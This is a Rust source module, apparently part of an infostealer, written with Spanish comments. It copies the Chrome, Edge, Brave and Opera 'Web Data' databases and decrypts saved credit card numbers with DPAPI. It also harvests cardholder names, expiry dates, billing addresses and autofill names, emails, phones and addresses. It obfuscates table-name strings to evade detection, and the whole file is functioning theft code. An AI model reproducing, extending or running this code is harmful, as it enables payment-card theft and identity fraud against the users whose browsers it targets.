// Stealer de tarjetas de crédito y autofill data de browsers
use crate::stealer::common::get_appdata_local;
use crate::stealer::chromium::decrypt_value_dpapi;
use rusqlite::Connection;
use std::path::PathBuf;
use obfstr::obfstr;

/// Tarjeta de crédito robada
#[derive(Debug, Clone)]
pub struct CreditCard {
    pub browser: String,
    pub name_on_card: String,
    pub card_number: String,
    pub expiration_month: i32,
    pub expiration_year: i32,
    pub billing_address: Option<String>,
    pub nickname: Option<String>,
}

impl CreditCard {
    pub fn to_string(&self) -> String {
        let mut output = format!("[{}]\n", self.browser);
        output.push_str(&format!("Name: {}\n", self.name_on_card));
        output.push_str(&format!("Card: {}\n", self.card_number));
        output.push_str(&format!("Expiration: {:02}/{}\n", self.expiration_month, self.expiration_year));
        
        if let Some(ref nickname) = self.nickname {
            if !nickname.is_empty() {
                output.push_str(&format!("Nickname: {}\n", nickname));
            }
        }
        
        if let Some(ref address) = self.billing_address {
            if !address.is_empty() {
                output.push_str(&format!("Billing Address: {}\n", address));
            }
        }
        
        output
    }
}

/// Dirección de autofill robada
#[derive(Debug, Clone)]
pub struct AutofillAddress {
    pub browser: String,
    pub name: Option<String>,
    pub email: Option<String>,
    pub phone: Option<String>,
    pub street_address: Option<String>,
    pub city: Option<String>,
    pub state: Option<String>,
    pub zip_code: Option<String>,
    pub country: Option<String>,
}

impl AutofillAddress {
    pub fn to_string(&self) -> String {
        let mut output = format!("[{}]\n", self.browser);
        
        if let Some(ref name) = self.name {
            if !name.is_empty() {
                output.push_str(&format!("Name: {}\n", name));
            }
        }
        
        if let Some(ref email) = self.email {
            if !email.is_empty() {
                output.push_str(&format!("Email: {}\n", email));
            }
        }
        
        if let Some(ref phone) = self.phone {
            if !phone.is_empty() {
                output.push_str(&format!("Phone: {}\n", phone));
            }
        }
        
        // Construir dirección completa
        let mut address_parts = Vec::new();
        
        if let Some(ref street) = self.street_address {
            if !street.is_empty() {
                address_parts.push(street.clone());
            }
        }
        
        if let Some(ref city) = self.city {
            if !city.is_empty() {
                address_parts.push(city.clone());
            }
        }
        
        if let Some(ref state) = self.state {
            if !state.is_empty() {
                address_parts.push(state.clone());
            }
        }
        
        if let Some(ref country) = self.country {
            if !country.is_empty() {
                address_parts.push(country.clone());
            }
        }
        
        if let Some(ref zip) = self.zip_code {
            if !zip.is_empty() {
                address_parts.push(zip.clone());
            }
        }
        
        if !address_parts.is_empty() {
            output.push_str(&format!("Address: {}\n", address_parts.join(", ")));
        }
        
        output
    }
}

/// Configuración de browser para robo de autofill
struct BrowserConfig {
    name: &'static str,
    web_data_path: &'static str,
}

const BROWSERS: &[BrowserConfig] = &[
    BrowserConfig {
        name: "Chrome",
        web_data_path: r"Google\Chrome\User Data\Default\Web Data",
    },
    BrowserConfig {
        name: "Edge",
        web_data_path: r"Microsoft\Edge\User Data\Default\Web Data",
    },
    BrowserConfig {
        name: "Brave",
        web_data_path: r"BraveSoftware\Brave-Browser\User Data\Default\Web Data",
    },
    BrowserConfig {
        name: "Opera",
        web_data_path: r"Opera Software\Opera Stable\Web Data",
    },
];

/// Roba tarjetas de crédito de todos los browsers
pub fn steal_credit_cards() -> Vec<CreditCard> {
    let mut all_cards = Vec::new();
    
    for browser in BROWSERS {
        if let Some(mut cards) = steal_credit_cards_from_browser(browser) {
            all_cards.append(&mut cards);
        }
    }
    
    all_cards
}

/// Roba tarjetas de crédito de un browser específico
fn steal_credit_cards_from_browser(browser: &BrowserConfig) -> Option<Vec<CreditCard>> {
    let local_appdata = get_appdata_local()?;
    let web_data_path = local_appdata.join(browser.web_data_path);
    
    if !web_data_path.exists() {
        return None;
    }
    
    // Copiar base de datos a temp (porque puede estar bloqueada)
    let temp_path = copy_to_temp(&web_data_path)?;
    
    let cards = extract_credit_cards(&temp_path, browser.name);
    
    // Eliminar archivo temporal
    std::fs::remove_file(&temp_path).ok();
    
    Some(cards)
}

/// Extrae tarjetas de crédito de la base de datos Web Data
fn extract_credit_cards(db_path: &PathBuf, browser_name: &str) -> Vec<CreditCard> {
    let mut cards = Vec::new();
    
    let conn = match Connection::open(db_path) {
        Ok(c) => c,
        Err(_) => return cards,
    };
    
    // Query para obtener tarjetas y direcciones
    let query = format!("
        SELECT 
            name_on_card,
            expiration_month,
            expiration_year,
            card_number_encrypted,
            billing_address_id,
            nickname
        FROM {}
    ", obfstr!("credit_cards"));
    
    let mut stmt = match conn.prepare(&query) {
        Ok(s) => s,
        Err(_) => return cards,
    };
    
    let card_iter = stmt.query_map([], |row| {
        Ok((
            row.get::<_, String>(0)?,      // name_on_card
            row.get::<_, i32>(1)?,          // expiration_month
            row.get::<_, i32>(2)?,          // expiration_year
            row.get::<_, Vec<u8>>(3)?,      // card_number_encrypted
            row.get::<_, Option<String>>(4)?, // billing_address_id
            row.get::<_, Option<String>>(5)?, // nickname
        ))
    });
    
    if let Ok(iter) = card_iter {
        for card_result in iter {
            if let Ok((name, exp_month, exp_year, encrypted_number, billing_id, nickname)) = card_result {
                // Desencriptar número de tarjeta con DPAPI
                if let Some(decrypted) = decrypt_value_dpapi(&encrypted_number) {
                    if let Ok(card_number) = String::from_utf8(decrypted) {
                        // Obtener dirección de billing si existe
                        let billing_address = if let Some(ref addr_id) = billing_id {
                            get_billing_address(&conn, addr_id)
                        } else {
                            None
                        };
                        
                        cards.push(CreditCard {
                            browser: browser_name.to_string(),
                            name_on_card: name,
                            card_number: format_card_number(&card_number),
                            expiration_month: exp_month,
                            expiration_year: exp_year,
                            billing_address,
                            nickname,
                        });
                    }
                }
            }
        }
    }
    
    cards
}

/// Roba direcciones de autofill de todos los browsers
pub fn steal_autofill_addresses() -> Vec<AutofillAddress> {
    let mut all_addresses = Vec::new();
    
    for browser in BROWSERS {
        if let Some(mut addresses) = steal_autofill_from_browser(browser) {
            all_addresses.append(&mut addresses);
        }
    }
    
    all_addresses
}

/// Roba direcciones de autofill de un browser específico
fn steal_autofill_from_browser(browser: &BrowserConfig) -> Option<Vec<AutofillAddress>> {
    let local_appdata = get_appdata_local()?;
    let web_data_path = local_appdata.join(browser.web_data_path);
    
    if !web_data_path.exists() {
        return None;
    }
    
    let temp_path = copy_to_temp(&web_data_path)?;
    let addresses = extract_autofill_addresses(&temp_path, browser.name);
    std::fs::remove_file(&temp_path).ok();
    
    Some(addresses)
}

/// Extrae direcciones de autofill de Web Data
fn extract_autofill_addresses(db_path: &PathBuf, browser_name: &str) -> Vec<AutofillAddress> {
    let mut addresses = Vec::new();
    
    let conn = match Connection::open(db_path) {
        Ok(c) => c,
        Err(_) => return addresses,
    };
    
    // Query para obtener perfiles de autofill
    let table_name = obfstr!("autofill_profile_addresses").to_string();
    let query = format!("
        SELECT 
            guid,
            street_address,
            city,
            state,
            zipcode,
            country_code
        FROM {}
    ", table_name);
    
    let mut stmt = match conn.prepare(&query) {
        Ok(s) => s,
        Err(_) => return addresses,
    };
    
    let addr_iter = stmt.query_map([], |row| {
        Ok((
            row.get::<_, String>(0)?,           // guid
            row.get::<_, Option<String>>(1)?,   // street_address
            row.get::<_, Option<String>>(2)?,   // city
            row.get::<_, Option<String>>(3)?,   // state
            row.get::<_, Option<String>>(4)?,   // zipcode
            row.get::<_, Option<String>>(5)?,   // country_code
        ))
    });
    
    if let Ok(iter) = addr_iter {
        for addr_result in iter {
            if let Ok((guid, street, city, state, zip, country)) = addr_result {
                // Obtener nombre, email y teléfono asociados al perfil
                let (name, email, phone) = get_profile_contact_info(&conn, &guid);
                
                addresses.push(AutofillAddress {
                    browser: browser_name.to_string(),
                    name,
                    email,
                    phone,
                    street_address: street,
                    city,
                    state,
                    zip_code: zip,
                    country,
                });
            }
        }
    }
    
    addresses
}

/// Obtiene información de contacto del perfil (nombre, email, teléfono)
fn get_profile_contact_info(conn: &Connection, guid: &str) -> (Option<String>, Option<String>, Option<String>) {
    let mut name = None;
    let mut email = None;
    let mut phone = None;
    
    // Obtener nombre
    let name_query = format!("SELECT full_name FROM {} WHERE guid = ?", obfstr!("autofill_profile_names"));
    if let Ok(mut stmt) = conn.prepare(&name_query) {
        if let Ok(result) = stmt.query_row([guid], |row| row.get::<_, String>(0)) {
            name = Some(result);
        }
    }
    
    // Obtener email
    let email_query = format!("SELECT email FROM {} WHERE guid = ?", obfstr!("autofill_profile_emails"));
    if let Ok(mut stmt) = conn.prepare(&email_query) {
        if let Ok(result) = stmt.query_row([guid], |row| row.get::<_, String>(0)) {
            email = Some(result);
        }
    }
    
    // Obtener teléfono
    let phone_query = format!("SELECT number FROM {} WHERE guid = ?", obfstr!("autofill_profile_phones"));
    if let Ok(mut stmt) = conn.prepare(&phone_query) {
        if let Ok(result) = stmt.query_row([guid], |row| row.get::<_, String>(0)) {
            phone = Some(result);
        }
    }
    
    (name, email, phone)
}

/// Obtiene la dirección de billing asociada a una tarjeta
fn get_billing_address(conn: &Connection, address_id: &str) -> Option<String> {
    let table_name = obfstr!("autofill_profile_addresses").to_string();
    let query = format!("
        SELECT 
            street_address,
            city,
            state,
            zipcode,
            country_code
        FROM {}
        WHERE guid = ?
    ", table_name);
    
    if let Ok(mut stmt) = conn.prepare(&query) {
        if let Ok((street, city, state, zip, country)) = stmt.query_row([address_id], |row| {
            Ok((
                row.get::<_, Option<String>>(0)?,
                row.get::<_, Option<String>>(1)?,
                row.get::<_, Option<String>>(2)?,
                row.get::<_, Option<String>>(3)?,
                row.get::<_, Option<String>>(4)?,
            ))
        }) {
            let mut parts = Vec::new();
            
            if let Some(s) = street { if !s.is_empty() { parts.push(s); } }
            if let Some(c) = city { if !c.is_empty() { parts.push(c); } }
            if let Some(st) = state { if !st.is_empty() { parts.push(st); } }
            if let Some(co) = country { if !co.is_empty() { parts.push(co); } }
            if let Some(z) = zip { if !z.is_empty() { parts.push(z); } }
            
            if !parts.is_empty() {
                return Some(parts.join(", "));
            }
        }
    }
    
    None
}

/// Copia base de datos a archivo temporal
fn copy_to_temp(db_path: &PathBuf) -> Option<PathBuf> {
    let temp_dir = std::env::temp_dir();
    let temp_name = format!("webdata_{}.db", std::process::id());
    let temp_path = temp_dir.join(temp_name);
    
    std::fs::copy(db_path, &temp_path).ok()?;
    
    Some(temp_path)
}

/// Formatea número de tarjeta (agregar espacios cada 4 dígitos)
fn format_card_number(card_number: &str) -> String {
    let clean = card_number.chars().filter(|c| c.is_numeric()).collect::<String>();
    
    clean.chars()
        .collect::<Vec<char>>()
        .chunks(4)
        .map(|chunk| chunk.iter().collect::<String>())
        .collect::<Vec<String>>()
        .join(" ")
}
